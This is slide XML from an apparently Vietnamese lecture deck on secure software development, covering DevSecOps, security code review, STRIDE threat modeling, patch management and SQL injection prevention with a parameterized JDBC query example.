              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Cách triển khai:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Security-as-Code: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ự </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>động hóa kiểm thử bảo mật (SAST, DAST, SCA) trong pipeline.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Shift-left security: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="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ưa </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>kiểm tra bảo mật sớm trong giai đoạn coding, không đợi đến sản phẩm hoàn thiện.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Continuous Monitoring: </a:t>
            </a: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iám </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>sát liên tục môi trường production.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Lợi ích: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hát </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hiện lỗ hổng sớm, tiết kiệm chi phí, tăng tốc độ triển khai an toàn..</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6090943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Code Review bảo mật &amp; Threat Modeling</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Code Review bảo mật:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kiểm tra thủ công (manual review) hoặc bằng tool (SonarQube, Fortify).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tập trung vào các lỗi phổ biến: SQLi, XSS, xử lý session, xác thực.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Threat Modeling:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Xác định các mối đe dọa tiềm ẩn trong kiến trúc ứng dụng (ví dụ STRIDE model: Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Giúp phát hiện rủi ro trước khi triển khai thực tế.</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6792798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Quản lý bản vá và cập nhật định kỳ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Cập nhật framework, CMS, thư viện: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>V</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>á </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>lỗ hổng trong các dependency (ví dụ: lỗ hổng Log4j, OpenSSL).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Quy trình quản lý bản vá (Patch Management):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Theo dõi cảnh báo bảo mật từ nhà cung cấp.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kiểm thử bản vá trong môi trường staging trước khi áp dụng production.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tự động hóa: dùng công cụ như Dependabot (GitHub) hoặc OWASP Dependency-Check để phát hiện thư viện lỗi thời.</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2594054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buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" i="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF00FF"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" i="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Lưu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>ý:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Secure SDLC đảm bảo bảo mật xuyên suốt vòng đời phát triển.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>DevSecOps giúp bảo mật liên tục và tự động trong CI/CD.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Code review + threat modeling ngăn chặn lỗ hổng từ giai đoạn thiết kế.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Quản lý bản vá là chìa khóa để giảm thiểu rủi ro zero-day và lỗ hổng từ bên thứ ba.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600"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24340091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3" y="546389"/>
            <a:ext cx="10242645" cy="474259"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3.2.6.</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ngừa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SQLi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57953" y="1020648"/>
            <a:ext cx="10078872" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ngăn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ngừa</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SQLi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>a1</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Sử </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>dụng Prepared </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Statement/Parameterized </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Query</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thay vì ghép chuỗi SQL từ dữ liệu đầu vào, nên dùng truy vấn tham số hóa.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ví dụ (Java – JDBC):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>stmt.setString(1, username);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="530352" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>stmt.setString(2, password);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Nhờ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>vậy dữ liệu được ràng buộc như tham số, không thể bị chèn mã SQL.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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0090066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3" y="546389"/>
            <a:ext cx="10242645" cy="474259"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3.2.6.</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ngừa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SQLi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57953" y="1020648"/>
            <a:ext cx="10365474" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ngăn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ngừa</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SQLi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>a2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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Sử dụng ORM Frameworks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Dùng Hibernate, Entity Framework, Django ORM… để hạn chế viết SQL thủ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>ORM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>thường tự động escape dữ liệu và áp dụng parameterized query.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>a3</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Áp </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>dụng nguyên tắc Least Privilege (ít quyền nhất)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tài khoản DB cho ứng dụng không nên có quyền DROP, ALTER, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>GRANT</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Giảm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>thiểu thiệt hại nếu bị khai thác.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>a4</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Triển </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>khai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ường </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>lửa ứng dụng web (WAF)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>WAF có thể phát hiện và chặn các payload SQLi phổ biến.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tuy nhiên chỉ là lớp phòng thủ bổ sung, không thay thế code an toàn.</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14649860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3" y="546389"/>
            <a:ext cx="10242645" cy="474259"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3.2.6.</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ngừa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SQLi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57953" y="1020648"/>
            <a:ext cx="10365474" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
